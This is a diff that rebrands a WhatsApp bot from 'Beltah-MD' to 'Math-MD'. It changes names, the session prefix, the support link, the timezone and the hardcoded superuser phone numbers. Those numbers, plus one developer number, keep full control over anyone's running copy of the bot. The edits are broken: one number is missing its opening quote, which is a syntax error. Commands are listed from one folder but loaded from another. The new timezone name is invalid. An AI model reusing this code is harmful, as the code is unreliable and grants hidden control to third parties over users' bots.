@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/BELTAH-MD;;;/g,"");
+var session = conf.session.replace(/MATH-MD;;;/g,"");
 const prefixe = conf.PREFIXE;
 
 
@@ -155,9 +155,9 @@ setTimeout(() => {
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const dj = '22559763447';
-            const dj2 = '254751284190';
-            const dj3 = "254742063632";
-            const luffy = '254762016957';
+            const dj2 = '255714595078';
+            const dj3 = "255764182801";
+            const luffy = 255620814108';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -754,7 +754,7 @@ zk.ev.on('group-participants.update', async (group) => {
                   zk.sendMessage(crons[i].group_id, { image : { url : './media/chrono.webp'} , caption: "Hello, it's time to close the group; sayonara." });
 
                 }, {
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -771,7 +771,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
                  
                 },{
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -807,24 +807,24 @@ zk.ev.on('group-participants.update', async (group) => {
                 console.log("ℹ️ Beltah is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Beltah Connected to WhatsApp! ☺️");
+                console.log("✅ Math Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Beltah Md is Online 🕸\n\n");
+                console.log("Math Md is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Beltah Commands ...\n");
+                console.log("Loading Math Commands ...\n");
                 fs.readdirSync(__dirname + "/beltah").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/beltah/" + fichier);
+                            require(__dirname + "/math/" + fichier);
                             console.log(fichier + " Installed Successfully✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} could not be installed due to : ${e}`);
-                        } /* require(__dirname + "/beltah/" + fichier);
+                        } /* require(__dirname + "/math/" + fichier);
                          console.log(fichier + " Installed ✔️")*/
                         (0, baileys_1.delay)(300);
                     }
@@ -845,7 +845,7 @@ zk.ev.on('group-participants.update', async (group) => {
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `  ☉ 𝗕𝗘𝗟𝗧𝗔𝗛-𝗠𝗗 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 ☉
+                let cmsg = `  ☉ MATH-𝗠𝗗 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 ☉
 ╭──────────────⁠☉
   ❒⁠⁠⁠⁠𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝙱𝚎𝚕𝚝𝚊𝚑 𝚃𝚎𝚌𝚑
   ❒⁠⁠⁠⁠𝗣𝗿𝗲𝗳𝗶𝘅    : [ ${prefixe} ]  
@@ -855,7 +855,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ╭──────────────⁠☉ 
   ☉𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗟𝗶𝗻𝗸: 
- [youtube.com/@Beltahtech2024] 
+ [youtube.com/@freeonlinetvT1] 
 
   ★𝗕𝗲𝗹𝘁𝗮𝗵-𝗧𝗲𝗰𝗵-𝗧𝗲𝗮𝗺
 ╰──────────────⏣`;
